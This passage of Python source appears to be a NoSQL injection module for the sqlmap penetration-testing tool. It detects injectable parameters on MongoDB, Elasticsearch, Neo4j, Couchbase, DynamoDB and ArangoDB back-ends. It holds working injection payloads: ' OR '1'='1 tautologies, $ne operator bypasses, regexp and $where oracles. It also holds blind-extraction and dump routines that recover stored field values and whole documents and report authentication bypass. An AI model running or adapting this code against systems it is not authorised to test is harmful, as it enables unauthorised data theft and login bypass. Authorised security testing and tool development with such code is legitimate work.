    return "'%s'" % name.replace("\\", "\\\\").replace("'", "\\'")

def _enumField(place, parameter, template, payloadFor, strict=False, falseModel=None):
    """Content-based recovery of the string matched by a regexp clause built via payloadFor(regexBody),
    reusing the bisection extractor against the always-true single-record `template`. `strict`
    propagates InconclusiveError (for structural field-name probes); `falseModel` (a never-matching
    response) enables relative true/false classification so an unrelated page is UNKNOWN, not false."""

    return _extract(template, lambda value: _fetchValue(place, parameter, value),
                    lambda n: payloadFor(".{%d,}" % n),
                    lambda known, klass: payloadFor(_quoted(_javaEscape(known) + klass)),
                    strict=strict, falseModel=falseModel)

def _enumDump(place, parameter, makePayload, keysExpr, valueExpr):
    """Whole-document dump via key enumeration for the regexp dialects: keysExpr(i) -> the i-th field
    name, valueExpr(name) -> that field's value. makePayload(targetExpr, regexBody) wraps the dialect
    break-out and record binding around a '<targetExpr> matches ^<regexBody>' oracle. Returns
    (columns, rows) or None - the caller can then fall back to single-field extraction"""

    # A whole-document dump is content-based, so it REQUIRES both models: a reproduced true (any-match)
    # page, a reproduced false (never-match) page, and CLEAR SEPARATION between them. Without all three,
    # classification would be one-sided (an unrelated usable page -> a fabricated false bit), so the dump
    # is DISABLED (return None) - it must never run _enumField with falseModel=None in a live dump.
    template = _reproduced(lambda: _fetchValue(place, parameter, makePayload(keysExpr(0), ".*")))
    falseModel = _reproduced(lambda: _fetchValue(place, parameter, makePayload(keysExpr(0), NOSQL_SENTINEL)))
    if not template or not falseModel or _ratio(template, falseModel) > UPPER_RATIO_BOUND:
        logger.debug("NoSQL dump disabled: could not calibrate separable true/false models")
        return None

    columns, values, partial = [], [], False
    for index in xrange(NOSQL_MAX_FIELDS):
        try:
            name = _enumField(place, parameter, template, lambda rb, i=index: makePayload(keysExpr(i), rb), strict=True, falseModel=falseModel)
        except InconclusiveError:
            partial = True                          # inconclusive NEXT field name != end of fields
            logger.warning("field enumeration became inconclusive at index %d; dump is PARTIAL" % index)
            break
        if not name:                                # genuine end (no more keys)
            break
        columns.append(name)
        cell = _enumField(place, parameter, template, lambda rb, n=name: makePayload(valueExpr(n), rb), falseModel=falseModel)
        values.append(INCONCLUSIVE_MARK if cell is None else cell)   # None => aborted; keep distinguishable from ""
        logger.info("retrieved: %s='%s'" % (name, values[-1]))

    if partial:
        logger.warning("document dump is INCOMPLETE (field enumeration aborted before end)")
    # NOT bound by default: the caller's makePayload uses only a sibling `constraint` (which may match
    # many records). A caller that pins a NATIVE id per record (e.g. _cypherDump's id(u)=k) marks its
    # own result bound. `complete` = not partial.
    return (columns, [values], False, not partial) if columns else None

def _cypherDump(place, parameter):
    """Blind multi-record collection dump (Neo4j Cypher). Walks every matched node in ascending order
    of its internal node id (a unique, ordered, always-present key - unlike property order, which Neo4j
    does not guarantee), key-enumerating each node's full document. Returns (columns, rows) or None"""

    fetch = lambda payload: _fetchValue(place, parameter, payload)
    # DUAL model: a record-ABSENT page (zero rows) AND a record-PRESENT page (all rows). Existence is
    # classified RELATIVE to both (shared resolveBit via _contentBit) - an unrelated usable page (e.g. a
    # session-expired / soft-WAF page) leans to NEITHER and is INCONCLUSIVE, never fabricated as "exists".
    absentModel = _reproduced(lambda: fetch("%s' OR '1'='2" % NOSQL_SENTINEL))
    presentModel = _reproduced(lambda: fetch("%s' OR '1'='1" % NOSQL_SENTINEL))
    if not absentModel or not presentModel or _ratio(presentModel, absentModel) > UPPER_RATIO_BOUND:
        return None                                     # not separable / not usable -> cannot dump safely

    # a numeric condition opens no string, so balance the app's trailing quote with a tautology; `exists`
    # is True only when the page leans to the present model over the absent model (retry/abort otherwise)
    exists = lambda cond: _contentBit(lambda v: fetch("%s' OR %s AND '1'='1" % (NOSQL_SENTINEL, cond)), None, presentModel, absentModel)

    def minIdGreater(lower):
        # smallest internal node id strictly greater than `lower` (None when no further node exists).
        # Grow an INDEPENDENT positive span from `lower` (never multiply the bound itself: with
        # lower=-1 the upper bound starts at 0 and `hi *= 2` stays 0 forever when node id 0 is absent -
        # deleting the earliest nodes is enough to hang the scan). Bounded by both a numeric ceiling
        # AND a probe cap.
        if not exists("id(u) > %d" % lower):
            return None
        span, probes = 1, 0
        hi = lower + span
        while not exists("id(u) > %d AND id(u) <= %d" % (lower, hi)):
            span *= 2
            hi = lower + span
            probes += 1
            if hi > (1 << 40) or probes > 64:
                return None
        lo = lower
        while lo + 1 < hi:
            mid = (lo + hi) // 2
            if exists("id(u) > %d AND id(u) <= %d" % (lower, mid)):
                hi = mid
            else:
                lo = mid
        return hi

    columns, records, lastId, complete = [], [], -1, True
    try:
        for _ in xrange(NOSQL_MAX_RECORDS):
            nodeId = minIdGreater(lastId)
            if nodeId is None:
                break
            record = _enumDump(place, parameter,
                               lambda expr, rb, k=nodeId: "%s' OR id(u)=%d AND %s =~ '^%s.*" % (NOSQL_SENTINEL, k, expr, rb),
                               lambda i: "keys(u)[%d]" % i, lambda n: "toString(u[%s])" % _propLiteral(n))
            if record:
                cols, values, _b, recComplete = record         # each field bound to the SAME node by id(u)=k
                records.append(dict(zip(cols, values[0])))     # align by field name (keys(u) order is per-node)
                columns.extend(_ for _ in cols if _ not in columns)
                if not recComplete:                            # a node's own fields were partially recovered
                    complete = False
            lastId = nodeId
        else:
            logger.warning("hit the NOSQL_MAX_RECORDS (%d) cap; some records may be omitted" % NOSQL_MAX_RECORDS)
            complete = False
    except InconclusiveError:
        # the node-id walk hit a persistently unusable oracle: stop and return what was recovered so
        # far (partial) rather than fabricate node existence from failed requests
        complete = False
        logger.warning("Cypher record walk aborted (oracle inconclusive); returning %d record(s) recovered so far" % len(records))

    # BOUND: every field of every record was pinned to a unique native node id (id(u)=k)
    return (columns, [[row.get(_, "") for _ in columns] for row in records], True, complete) if records else None

def _partiqlValue(place, parameter, bind, field):
    """Blind extraction of `field` for the bound record on a DynamoDB PartiQL point. PartiQL has no
    regexp, so each character is recovered by an ordered string comparison (field >= 'prefix'+char),
    bisected over the printable-ASCII range. Returns the value or None"""

    quote = lambda value: value.replace("'", "''")              # PartiQL escapes a single quote by doubling it
    fetch = lambda payload: _fetchValue(place, parameter, payload)
    template = _reproduced(lambda: fetch("%s' OR %s%s >= '" % (NOSQL_SENTINEL, bind, field)))   # field >= '' -> match (TRUE model)
    # FALSE model: `... OR '1'='2` never matches (the bound record is absent), so each comparison bit is
    # classified relative to BOTH models; without it a session-expired/soft-WAF page would become a false
    # bit. Cannot calibrate both -> disable extraction rather than one-side.
    falseModel = _reproduced(lambda: fetch("%s' OR '1'='2" % NOSQL_SENTINEL))
    if not template or not falseModel or _ratio(template, falseModel) > UPPER_RATIO_BOUND:
        return None

    truth = lambda value: _contentBit(lambda v: fetch("%s' OR %s%s >= '%s" % (NOSQL_SENTINEL, bind, field, quote(v))), value, template, falseModel)

    try:
        retVal = ""
        while len(retVal) < NOSQL_MAX_LENGTH:
            if not truth(retVal + chr(NOSQL_CHAR_MIN)):         # no character at this position -> end of value
                break
            lo, hi = NOSQL_CHAR_MIN, NOSQL_CHAR_MAX
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if truth(retVal + chr(mid)):
                    lo = mid
                else:
                    hi = mid - 1
            retVal += chr(lo)
    except InconclusiveError:
        logger.warning("PartiQL extraction aborted for a value (oracle inconclusive after retries)")
        return None

    return retVal or None

def _partiqlDump(place, parameter, key):
    """DynamoDB PartiQL: comparison-extract the injected field, bound to its record by sibling
    parameters (PartiQL exposes no key-enumeration, so the dumpable field is the injected one)"""

    bind = _constraint(place, parameter, "=", " AND ", prefix="")
    if not bind:                                                # need a sibling to pin a single record
        return None
    value = _partiqlValue(place, parameter, bind, key)
    # a single sibling is not proven to be the COMPLETE partition+sort key, so cardinality-one is not
    # established -> representative (the recovered value could belong to any record matching `bind`)
    return ([key], [[value]], False, True) if value is not None else None

def _extract(template, fetchFn, lengthValue, charValue, truthFn=None, strict=False, falseModel=None):
    """Blind value recovery: binary-searches the length, then bisects each character's codepoint over
    the printable-ASCII range using regexp character-class ranges (sqlmap-style inference, ~log2(range)
    requests per character instead of a linear scan - far smaller WAF/log footprint). lengthValue(n)
    and charValue(known, charClass) render the dialect payload; the oracle is the content ratio against
    `template` by default, or `truthFn(payload)` (e.g. the $where timing predicate).

    Return contract distinguishes THREE outcomes so a structural caller never confuses them:
      - a recovered value (incl. "" for a genuine zero-length value);
      - InconclusiveError raised when `strict` and the oracle aborts (a structural probe - a field NAME
        or a next-row pin - must treat this as UNKNOWN, not end-of-data);
      - None returned when NOT `strict` and the oracle aborts (a per-value abort: caller renders a marker).
    """

    truth = truthFn or (lambda value: _contentBit(fetchFn, value, template, falseModel))

    try:
        length, probe = 0, 1
        while probe <= NOSQL_MAX_LENGTH and truth(lengthValue(probe)):
            length, probe = probe, probe * 2

        low, high = length, min(probe, NOSQL_MAX_LENGTH + 1)
        while low + 1 < high:
            mid = (low + high) // 2
            if truth(lengthValue(mid)):
                low = mid
            else:
                high = mid

        if not low:
            return ""                                           # genuine zero-length value / end (NOT abort)

        debugMsg = "retrieving the value (%d characters)" % low
        logger.debug(debugMsg)

        retVal = ""
        for _ in xrange(low):
            lo, hi = NOSQL_CHAR_MIN, NOSQL_CHAR_MAX
            if not truth(charValue(retVal, _klass(lo, hi))):
                retVal += '?'                                   # character outside the printable-ASCII range
                continue
            while lo < hi:
                mid = (lo + hi) // 2
                if truth(charValue(retVal, _klass(lo, mid))):
                    hi = mid
                else:
                    lo = mid + 1
            retVal += chr(lo)
    except InconclusiveError:
        # a structural caller must SEE the abort (to mark the dump partial / abort), not read it as
        # end-of-data; a per-value caller instead gets None and renders an inconclusive marker
        logger.warning("NoSQL extraction aborted for a value (oracle inconclusive after retries)")
        if strict:
            raise
        return None

    return retVal

def _resolve(place, parameter, key):
    """Tries each NoSQL dialect in turn; the first that detects fixes the back-end and the extraction
    payloads. Returns a Vector (whose `template`/`lengthValue` are None for detection-only back-ends)
    or None when nothing matches"""

    field = "u.%s" % key

    template = _detectMongo(place, parameter)
    if template:
        falseModel = _reproduced(lambda: _fetch(place, parameter, "$in", NOSQL_SENTINEL, isArray=True))   # matches nothing
        return Vector(_fingerprintMongo(place, parameter),
                      lambda value: _fetch(place, parameter, "$regex", value),
                      lambda n: "^.{%d,}$" % n,
                      lambda known, klass: "^%s%s" % (re.escape(known), klass),
                      template=template, bypass='{"$ne": null}', falseModel=falseModel)

    template = _detectES(place, parameter)
    if template:
        falseModel = _reproduced(lambda: _fetchValue(place, parameter, NOSQL_SENTINEL))                   # literal sentinel matches nothing
        return Vector(_fingerprintLucene(place, parameter),
                      lambda value: _fetchValue(place, parameter, value),
                      lambda n: "/.{%d,}/" % n,
                      lambda known, klass: "/%s%s.*/" % (_lucene(known), klass),
                      template=template, bypass='*', falseModel=falseModel)

    template = _detectCypher(place, parameter)
    if template:
        constraint = _constraint(place, parameter)

        # Neo4j Cypher, Couchbase N1QL and DynamoDB PartiQL all share the ' OR '1'='1 break-out - which
        # is ALSO identical to classic SQL string injection. Attribute a back-end ONLY on a positive,
        # engine-specific primitive: Cypher '=~' regex or STARTS WITH, N1QL REGEXP_CONTAINS, PartiQL
        # begins_with. If NONE confirms, this is a plain SQL string injection, not NoSQL -> return None
        # (the old unconditional Neo4j fall-through turned every SQLi string parameter into a false Neo4j).
        # NOTE the confirm pairs differ ONLY in the engine-specific clause ('=~' regex body, or the
        # STARTS WITH prefix), with an IDENTICAL false tautology tail on both sides - so the
        # divergence is attributable to the Cypher primitive alone, never to the shared '1'='x'
        # tautology (which a SQL back-end would also flip).
        cypher = _confirm(place, parameter, "%s' OR %s%s =~ '.*" % (NOSQL_SENTINEL, constraint, field), "%s' OR %s%s =~ '%s" % (NOSQL_SENTINEL, constraint, field, NOSQL_SENTINEL)) \
            or _confirmBattery(place, parameter,
                               lambda p: "%s' OR %s OR '1'='2" % (NOSQL_SENTINEL, p),
                               lambda p: "%s' OR %s OR '1'='2" % (NOSQL_SENTINEL, p), _CYPHER_PREDICATES)
        if not cypher:
            if _confirm(place, parameter, "%s' OR REGEXP_CONTAINS(%s, '.*') OR '1'='2" % (NOSQL_SENTINEL, field), "%s' OR REGEXP_CONTAINS(%s, '%s') OR '1'='2" % (NOSQL_SENTINEL, field, NOSQL_SENTINEL)):
                # bind EVERY probe (length, char, key-index, value) to the sibling-identified record by
                # AND-ing the `constraint` into the OR-clause: `... OR (u.id='7' AND REGEXP_CONTAINS(..))
                # OR ...`. Without this the key/value predicates could match DIFFERENT documents, so a
                # `bound=True` label would be false (the reviewer's P0-6). When `constraint` is empty the
                # clause is just the predicate and bound=False, honestly marking the dump representative.
                # never-matching regexp body = the FALSE model (bound identically to the extraction)
                cbFalse = _reproduced(lambda: _fetchValue(place, parameter, "%s' OR (%sREGEXP_CONTAINS(%s, '^%s')) OR '1'='2" % (NOSQL_SENTINEL, constraint, field, NOSQL_SENTINEL)))
                return Vector("Couchbase",
                              lambda value: _fetchValue(place, parameter, value),
                              lambda n: "%s' OR (%sREGEXP_CONTAINS(%s, '^.{%d,}')) OR '1'='2" % (NOSQL_SENTINEL, constraint, field, n),
                              lambda known, klass: "%s' OR (%sREGEXP_CONTAINS(%s, '^%s')) OR '1'='2" % (NOSQL_SENTINEL, constraint, field, _quoted(_javaEscape(known) + klass)),
                              template=template, bypass="' OR '1'='1",
                              dump=lambda: _enumDump(place, parameter,
                                                     lambda expr, rb: "%s' OR (%sREGEXP_CONTAINS(%s, '^%s')) OR '1'='2" % (NOSQL_SENTINEL, constraint, expr, rb),
                                                     lambda i: "OBJECT_NAMES(u)[%d]" % i, lambda n: "TOSTRING(u[%s])" % _propLiteral(n)),
                              bound=bool(constraint), falseModel=cbFalse)

            if _confirm(place, parameter, "%s' OR begins_with(%s, '') OR '1'='2" % (NOSQL_SENTINEL, key), "%s' OR begins_with(%s, '%s') OR '1'='2" % (NOSQL_SENTINEL, key, NOSQL_SENTINEL)):
                return Vector("DynamoDB", None, None, None, template=template, bypass="' OR '1'='1",
                              dump=lambda: _partiqlDump(place, parameter, key))

            return None     # SQL-shared break-out with no Cypher/N1QL/PartiQL primitive -> not NoSQL

        return Vector("Neo4j", None, None, None, template=template, bypass="' OR '1'='1",
                      dump=lambda: _cypherDump(place, parameter) or _enumDump(place, parameter,
                                             lambda expr, rb: "%s' OR %s%s =~ '^%s.*" % (NOSQL_SENTINEL, constraint, expr, rb),
                                             lambda i: "keys(u)[%d]" % i, lambda n: "toString(u[%s])" % _propLiteral(n)))

    template = _detectAQL(place, parameter)
    if template:
        constraint = _constraint(place, parameter, "==", " && ")

        # ArangoDB AQL and MongoDB $where (server-side JavaScript) both satisfy the ' || '1'=='1
        # break-out; tell them apart by which regexp-match primitive holds - AQL '=~' or a JS /re/.test().
        # Attribute a back-end ONLY on a positive primitive; if NEITHER confirms, don't default to
        # ArangoDB (that would be an unconfirmed attribution) - return None.
        aqlRegex = _confirm(place, parameter, "%s' || ('x' =~ '.') || '1'=='2" % NOSQL_SENTINEL, "%s' || ('x' =~ 'y') || '1'=='2" % NOSQL_SENTINEL)
        if not aqlRegex:
            if _confirm(place, parameter, "%s' || /./.test('x') || '1'=='2" % NOSQL_SENTINEL, "%s' || /y/.test('x') || '1'=='2" % NOSQL_SENTINEL):
                bound = _constraint(place, parameter, "==", "&&", prefix="this.")
                whereTemplate = _fetchValue(place, parameter, "%s' || (%sthis.%s) || '1'=='2" % (NOSQL_SENTINEL, bound, key))
                whereFalse = _reproduced(lambda: _fetchValue(place, parameter, "%s' || (%sthis.%s&&/%s/.test(this.%s)) || '1'=='2" % (NOSQL_SENTINEL, bound, key, NOSQL_SENTINEL, key)))
                return Vector("MongoDB ($where)",
                              lambda value: _fetchValue(place, parameter, value),
                              lambda n: "%s' || (%sthis.%s&&this.%s.length>=%d) || '1'=='2" % (NOSQL_SENTINEL, bound, key, key, n),
                              lambda known, klass: "%s' || (%sthis.%s&&/^%s%s/.test(this.%s)) || '1'=='2" % (NOSQL_SENTINEL, bound, key, _javaEscape(known), klass, key),
                              template=whereTemplate, bypass="' || '1'=='1", falseModel=whereFalse)
            return None

        aqlFalse = _reproduced(lambda: _fetchValue(place, parameter, "%s' || (%s%s =~ '^%s') || '1'=='2" % (NOSQL_SENTINEL, constraint, field, NOSQL_SENTINEL)))
        return Vector("ArangoDB",
                      lambda value: _fetchValue(place, parameter, value),
                      lambda n: "%s' || (%s%s =~ '^.{%d,}') || '1'=='2" % (NOSQL_SENTINEL, constraint, field, n),
                      lambda known, klass: "%s' || (%s%s =~ '^%s') || '1'=='2" % (NOSQL_SENTINEL, constraint, field, _quoted(_javaEscape(known) + klass)),
                      template=template, bypass="' || '1'=='1",
                      dump=lambda: _enumDump(place, parameter,
                                             lambda expr, rb: "%s' || (%s%s =~ '^%s') || '1'=='2" % (NOSQL_SENTINEL, constraint, expr, rb),
                                             lambda i: "ATTRIBUTES(u)[%d]" % i, lambda n: "TO_STRING(u[%s])" % _propLiteral(n)),
                      bound=bool(constraint), falseModel=aqlFalse)

    numeric = _detectNumeric(place, parameter)
    if numeric:
        dbms, template, bypass = numeric
        dump = None
        if dbms == "Neo4j":                                     # bind the dump to the injected numeric field (e.g. u.id = 1)
            value = (_originalValue(place, parameter) or "1").strip()
            dump = lambda: _enumDump(place, parameter,
                                     lambda expr, rb: "%s AND (%s =~ '^%s.*')" % (value, expr, rb),
                                     lambda i: "keys(u)[%d]" % i, lambda n: "toString(u[%s])" % _propLiteral(n))
        return Vector(dbms, None, None, None, template=template, bypass=bypass, dump=dump)

    threshold = _detectWhere(place, parameter)
    if threshold is not None:
        bound = _constraint(place, parameter, "==", "&&", prefix="d.")
        # with no sibling constraint the $where busy-loop matches whichever document(s) the scan
        # reaches, so Object.keys(d)/String(d[k]) are not proven to come from ONE record -> representative
        return Vector("MongoDB ($where)", None, None, None,
                      dump=lambda: _whereDump(place, parameter, bound, threshold),
                      bound=bool(bound))

    engine = _detectError(place, parameter)
    if engine:
        return Vector(engine, None, None, None)

    return None

def _inband(place, parameter, template):
    """In-band data exposure gate: returns the always-true response when it carries materially more
    (reflected) content than the original request - i.e. the injection is returning extra records
    directly - else None"""

    original = _fetchValue(place, parameter, _originalValue(place, parameter) or "1")
    if original is None:            # a blocked/failed baseline is UNKNOWN - not a basis for comparison
        return None
    if template and len(template) > len(original) and _ratio(template, original) < UPPER_RATIO_BOUND and not re.search(NOSQL_ERROR_REGEX, template):
        return template
    return None

def _clean(cell):
    cell = re.sub(r"(?s)<[^>]+>", "", cell)
    for entity, char in (("&amp;", '&'), ("&lt;", '<'), ("&gt;", '>'), ("&quot;", '"'), ("&#39;", "'"), ("&apos;", "'")):
        cell = cell.replace(entity, char)
    return re.sub(r"\s+", " ", cell).strip()

def _records(page):
    """Parses structured records out of a reflected response - a JSON array of objects or an HTML
    table - returning (columns, rows) for a tabular dump, else None"""

    try:
        data = json.loads(page, object_pairs_hook=OrderedDict)
        rows = data if isinstance(data, list) else next((_ for _ in data.values() if isinstance(_, list)), None) if isinstance(data, dict) else None
        rows = [_ for _ in (rows or []) if isinstance(_, dict)]
        if rows:
            columns = []
            for row in rows:
                columns.extend(_ for _ in row if _ not in columns)
            return columns, [[("NULL" if row[_] is None else _clean("%s" % row[_])) if _ in row else "" for _ in columns] for row in rows]
    except (ValueError, TypeError):
        pass

    for body in re.findall(r"(?is)<table[^>]*>(.*?)</table>", page or ""):
        header, rows = None, []
        for index, tr in enumerate(re.findall(r"(?is)<tr[^>]*>(.*?)</tr>", body)):
            cells = re.findall(r"(?is)<t[dh][^>]*>(.*?)</t[dh]>", tr)
            if index == 0 and re.search(r"(?i)<th[\s>]", tr):
                header = [_clean(_) for _ in cells]
            elif cells:
                rows.append([_clean(_) for _ in cells])
        if rows:
            width = max(len(_) for _ in rows)
            columns = header if header and len(header) == width else ["column_%d" % (_ + 1) for _ in xrange(width)]
            return columns, [row + [""] * (width - len(row)) for row in rows]

    return None

def _grid(columns, rows):
    """Renders (columns, rows) as a sqlmap-style ASCII table"""

    widths = [max([len(columns[index])] + [len(row[index]) for row in rows if index < len(row)]) for index in xrange(len(columns))]
    separator = '+' + '+'.join('-' * (width + 2) for width in widths) + '+'
    line = lambda cells: "| " + " | ".join((cells[index] if index < len(cells) else "").ljust(widths[index]) for index in xrange(len(columns))) + " |"
    return "\n".join([separator, line(columns), separator] + [line(row) for row in rows] + [separator])

def _dumpInband(place, key, page):
    """Renders in-band records as a regular sqlmap-style table, or falls back to cleaned text"""

    parsed = _records(page)
    if parsed:
        columns, rows = parsed
        conf.dumper.singleString("NoSQL: %s parameter '%s' in-band records [%d]:\n%s" % (place, key, len(rows), _grid(columns, rows)))
    else:
        text = re.sub(r"\s+", " ", re.sub(r"(?s)<[^>]+>", " ", page)).strip()
        conf.dumper.singleString("NoSQL: %s parameter '%s' in-band data: %s" % (place, key, text[:NOSQL_DUMP_LIMIT]))

def nosqlScan():
    """Entry point for '--nosql': detects NoSQL injection (MongoDB/CouchDB operator, Lucene
    query_string, Cypher/N1QL/AQL string break-out, MongoDB $where time-based, or error-based). On a
    confirmed point it tries, in order, to (1) dump records exposed in-band by the always-true payload
    and (2) blindly recover the targeted field via the regexp/timing oracle"""

    global NOSQL_SENTINEL, _sqlErrorSeen
    NOSQL_SENTINEL = randomStr(length=10, lowercase=True)
    _sqlErrorSeen = False

    # NoSQL injection from an application-scoped point is confined to the back-end's single query
    # (one collection/label) - it confirms and dumps what that query can reach, with no analog to the
    # SQL database/table/user/banner enumeration, so those switches do not apply here
    debugMsg = "'--nosql' is self-contained: it confirms the injection and dumps the reachable "
    debugMsg += "collection/document. SQL enumeration switches (e.g. --banner, --dbs, --tables, "
    debugMsg += "--users, --sql-query) do not map to a NoSQL back-end and are ignored"
    logger.debug(debugMsg)

    tested = found = 0

    for place in (_ for _ in NOSQL_PLACES if _ in conf.paramDict):
        # mirror sqlmap's SQL place level-gating: Cookie parameters are only tested at --level >= 2
        if place == PLACE.COOKIE and conf.level < 2:
            continue
        for parameter in list(conf.paramDict[place].keys()):
            key = _jsonKey(parameter)

            if conf.testParameter and not any(_ in conf.testParameter for _ in (key, parameter)):
                continue

            tested += 1
            infoMsg = "testing NoSQL injection on %s parameter '%s'" % (place, key)
            logger.info(infoMsg)

            vector = _resolve(place, parameter, key)
            if not vector:
                continue

            found += 1
            infoMsg = "%s parameter '%s' is vulnerable to NoSQL injection (back-end: '%s')" % (place, key, vector.dbms)
            logger.info(infoMsg)
            if conf.beep:
                beep()

            # standard sqlmap-style injection-point summary (reproducible vector)
            if vector.bypass == '{"$ne": null}':
                title, payload = "operator injection", "%s[$ne]=%s" % (key, NOSQL_SENTINEL)
            elif vector.bypass == '*':
                title, payload = "Lucene query_string injection", "%s=*" % key
            elif vector.bypass:
                context = "numeric" if vector.bypass[:1].isdigit() else "string"
                title, payload = "boolean-based blind (%s)" % context, "%s=%s" % (key, vector.bypass)
            elif vector.dump is not None:
                title, payload = "time-based blind (server-side JavaScript $where)", "%s=' || (sleep loop) || '" % key
            else:
                title, payload = "error-based", "%s=%s'" % (key, _originalValue(place, parameter) or "1")
            report = "---\nParameter: %s (%s)\n    Type: NoSQL injection\n    Title: %s %s\n    Payload: %s\n---" % (key, place, vector.dbms, title, payload)
            conf.dumper.singleString(report)

            if vector.bypass:
                # report the payload ACTUALLY tested (e.g. '[$ne]=<sentinel>'), not an idealized form
                # like '{"$ne": null}' that was never sent - `null` can behave differently server-side
                infoMsg = "%s parameter '%s' can be coerced always-true with '%s' (e.g. authentication/filter bypass)" % (place, key, payload)
                logger.info(infoMsg)

            dumped = False

            # a named whole-document dump is preferred over the unnamed in-band table
            if vector.dump is not None:
                infoMsg = "retrieving the reachable document(s)"
                logger.info(infoMsg)
                records = vector.dump()
                if records:
                    # dump implementations return (columns, rows, bound, complete): `bound` reflects the
                    # vector that ACTUALLY succeeded (a native record id pinned in every predicate);
                    # `complete` is False when enumeration aborted / hit a cap. Both statuses are shown
                    # in the FINAL dumper header, not merely logged, so a partial/representative result
                    # is never presented as a complete coherent document.
                    columns, rows, bound, complete = records
                    logger.info("dumped %d record%s (%d field%s)" % (len(rows), 's' if len(rows) != 1 else '', len(columns), 's' if len(columns) != 1 else ''))
                    status = []
                    if not bound:
                        status.append("REPRESENTATIVE: record identity unproven")
                        logger.warning("no unique-record binding (no native record id / cardinality-one proof); fields below are REPRESENTATIVE and may not all belong to the same document")
                    if not complete:
                        status.append("PARTIAL: oracle inconclusive / cap reached")
                        logger.warning("the document dump is INCOMPLETE")
                    header = "documents" if len(rows) != 1 else "document"
                    tag = (" [%s]" % "; ".join(status)) if status else " [COMPLETE]"
                    conf.dumper.singleString("NoSQL: %s parameter '%s' %s%s:\n%s" % (place, key, header, tag, _grid(columns, rows)))
                    dumped = True

            if not dumped and vector.template is not None:
                exposure = _inband(place, parameter, vector.template)
                if exposure:
                    infoMsg = "the always-true payload returns additional records (in-band data exposure)"
                    logger.info(infoMsg)
                    _dumpInband(place, key, exposure)
                    dumped = True

            if vector.lengthValue is not None:
                # content extraction needs BOTH models: without a calibrated false model, classification
                # would be one-sided (an unrelated usable page -> a fabricated false bit), so DISABLE
                # extraction rather than risk corrupt data (the reviewer's invariant)
                if vector.truth is None and vector.falseModel is None:
                    logger.warning("%s parameter '%s': content extraction disabled - could not calibrate a false model "
                                   "(one-sided classification risks fabricated values)" % (place, key))
                else:
                    value = _extract(vector.template, vector.fetch, vector.lengthValue, vector.charValue,
                                     vector.truth, falseModel=vector.falseModel)
                    if value is not None:
                        conf.dumper.singleString("NoSQL: %s parameter '%s' -> %s" % (place, key, repr(value)))
                        dumped = True

            if not dumped:
                if vector.template is None and vector.truth is None and vector.dump is None:
                    warnMsg = "injection is detection-only for back-end '%s' (no extraction oracle for this engine)" % vector.dbms
                else:
                    warnMsg = "injection on '%s' is confirmed but yielded no data here: this point exposes only a boolean oracle on a non-extractable (e.g. numeric) field. Target a string-compared parameter (e.g. a login/search field) to blindly read a value" % key
                logger.warning(warnMsg)

    if not found:
        warnMsg = "no parameter appears to be injectable via NoSQL injection (%d tested)" % tested
        logger.warning(warnMsg)
        if _sqlErrorSeen:
            warnMsg = "a NoSQL probe triggered a back-end DBMS (SQL) error, which strongly suggests the "
            warnMsg += "target is a classic SQL injection - re-run without '--nosql' to test for it"
            logger.warning(warnMsg)

    logger.info("NoSQL scan complete")
